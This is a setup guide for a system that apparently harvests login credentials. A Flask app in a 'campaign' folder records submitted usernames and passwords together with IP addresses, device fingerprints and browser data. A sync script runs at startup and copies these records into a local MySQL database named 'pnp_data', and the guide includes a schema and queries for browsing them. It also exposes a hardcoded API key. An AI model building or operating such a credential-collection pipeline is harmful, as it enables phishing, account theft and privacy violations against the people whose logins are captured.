# Cloud to Local Database Sync - Setup Guide

## Overview
This system automatically syncs login data from your cloud application to a local MySQL database (XAMPP).

### How It Works
1. **Cloud Server (app.py)**: Captures login attempts and saves them to `data.csv` with full details:
   - Username & Password
   - Timestamp (PHT timezone)
   - IP Address
   - Device Fingerprint
   - Device Type (Phone/Tablet/Desktop)
   - Browser Information

2. **Local Sync Script (local_sync.py)**: Periodically fetches new data from the cloud and stores it in MySQL

---

## Prerequisites

### Cloud Server
- Flask application running on Render or similar hosting
- Valid API Key defined (currently: `abcdefghijklmnopnp2025`)
- `data.csv` file to store login attempts

### Local Server (XAMPP)
- MySQL/MariaDB running (default: port 3306)
- MySQL credentials:
  - Host: `localhost`
  - User: `root` (default)
  - Password: `` (empty by default)
  - Database: `pnp_data` (will be created automatically)

---

## Installation Steps

### 1. Install Required Python Packages
```bash
pip install requests mysql-connector-python
```

### 2. Configure Cloud URL (local_sync.py)
Update the `CLOUD_URL` variable to point to your cloud server:

```python
# Before:
CLOUD_URL = "https://YOUR_DOMAIN.com/api/fetch-entries"
```

### 3. Configure MySQL Connection (local_sync.py)
Update `MYSQL_CONFIG` if needed:

```python
MYSQL_CONFIG = {
    'host': 'localhost',        # Your MySQL host
    'user': 'root',             # Your MySQL username
    'password': '',             # Your MySQL password
    'database': 'pnp_data'      # Database name
}
```

### 4. Set Sync Interval (local_sync.py)
Default is 60 seconds. Adjust as needed:

```python
SYNC_INTERVAL = 60  # in seconds
```

---

## Running the Sync

### Option 1: Direct Execution
```bash
python local_sync.py
```

### Option 2: Run in Background (Windows)
Create a batch file `run_sync.bat`:
```batch
@echo off
python local_sync.py
pause
```

### Option 3: Schedule with Task Scheduler (Windows)
1. Open Task Scheduler
2. Create Basic Task → Name it "PNP Data Sync"
3. Trigger: On startup
4. Action: Start a program `python.exe` with arguments `C:\path\to\local_sync.py`

### Option 4: Run as Service (Advanced)
Use `nssm` (Non-Sucking Service Manager) to run as Windows service

---

## Database Schema

The local `login_data` table is automatically created with:

| Column | Type | Description |
|--------|------|-------------|
| id | INT (PK) | Auto-increment ID |
| username | VARCHAR(255) | Login username |
| password | VARCHAR(255) | Login password |
| timestamp | VARCHAR(100) | Login time (PHT) |
| ip_address | VARCHAR(45) | Visitor IP address |
| device_fingerprint | VARCHAR(255) | Device fingerprint hash |
| device_type | VARCHAR(50) | Device type (Phone/Tablet/Desktop) |
| browser_info | LONGTEXT | Browser details (JSON) |
| synced_at | TIMESTAMP | When data was synced |

---

## API Endpoint (Cloud Server)

### Endpoint: `/api/fetch-entries`
- **Method**: POST
- **Authentication**: Bearer token (API_KEY)
- **Request Body**:
```json
{
  "last_sync_timestamp": "2026-03-16 02:30:45 PHT"
}
```

- **Response**:
```json
{
  "entries": [
    {
      "username": "user@example.com",
      "password": "encrypted_password",
      "timestamp": "2026-03-16 02:35:12 PHT",
      "ip_address": "192.168.1.100",
      "device_fingerprint": "abc123def456",
      "device_type": "Desktop",
      "browser_info": {
        "browser_name": "Chrome",
        "browser_version": "120.0.0.0",
        "full_user_agent": "Mozilla/5.0..."
      }
    }
  ],
  "count": 1,
  "sync_timestamp": "2026-03-16 02:40:00 PHT",
  "status": "success"
}
```

---

## Troubleshooting

### Connection Error: "Connection refused"
- MySQL server is not running
- Start XAMPP and enable MySQL
- Check if MySQL is listening on port 3306

### Authentication Error: "Unauthorized"
- API_KEY in `local_sync.py` doesn't match cloud server
- Update API_KEY to match

### Cloud URL Error: "API endpoint not found"
- Ensure cloud server is running
- Verify correct URL format: `https://domain.com/api/fetch-entries`
- Check if cloud app is deployed

### Sync Timestamp File Issues
- The script saves last sync time to `last_sync.txt`
- Delete this file to perform a full resync
- Ensure write permissions in the directory

### Database Connection Fails
```
Database error: Access denied for user 'root'@'localhost'
```
- Check MySQL credentials
- Verify MySQL is running
- Try: `mysql -u root` from command line

---

## Monitoring

The script provides console output:
```
======================================================================
   🔄 CLOUD TO LOCAL DATABASE SYNC
======================================================================
☁️  Cloud Server: https://example.com/api/fetch-entries
💾 Database: root@localhost/pnp_data
⏱️  Sync interval: 60 seconds
======================================================================

✓ Database 'pnp_data' ready
✓ Table 'login_data' ready
✓ Setup complete. Starting sync loop...
  Press Ctrl+C to stop

[2026-03-16 02:30:00 PM] Starting sync...
  Last sync: 2026-03-16 02:20:00 PHT
  📡 Connecting to: https://example.com/api/fetch-entries
  ✓ Connected successfully. Response: 5 entries
  Found 5 new entries
✓ Saved 5 entries to database
  Updated sync timestamp: 2026-03-16 02:35:45 PHT
```

---

## Security Recommendations

1. **Change API Key**: Update `API_KEY` to a random secure value
2. **Update Password**: Change `dashboard_password` in app.py
3. **Use HTTPS**: Ensure cloud server uses SSL/TLS
4. **MySQL Password**: Set a strong MySQL password
5. **Firewall**: Restrict MySQL access to localhost only
6. **Log Rotation**: Implement log archival for sensitive data

---

## File Locations

- **Cloud Server**: `campaign/app.py`
- **Local Sync Script**: `campaign/local_sync.py`
- **Data File**: `campaign/data.csv`
- **Sync Timestamp**: `last_sync.txt` (in sync script directory)
- **Last Modified**: `campaign/last_modified.txt`

---

## Example Usage

### Check synced data in MySQL:
```sql
-- View all synced records
SELECT COUNT(*) FROM pnp_data.login_data;

-- View recent logins
SELECT * FROM pnp_data.login_data 
ORDER BY synced_at DESC 
LIMIT 10;

-- Count by device type
SELECT device_type, COUNT(*) FROM pnp_data.login_data 
GROUP BY device_type;

-- Filter by IP address
SELECT * FROM pnp_data.login_data 
WHERE ip_address = '192.168.1.100';
```

---

## Support

For issues or questions:
1. Check the troubleshooting section above
2. Verify all configuration values
3. Check console output for detailed error messages
4. Ensure cloud server is accessible and responding correctly
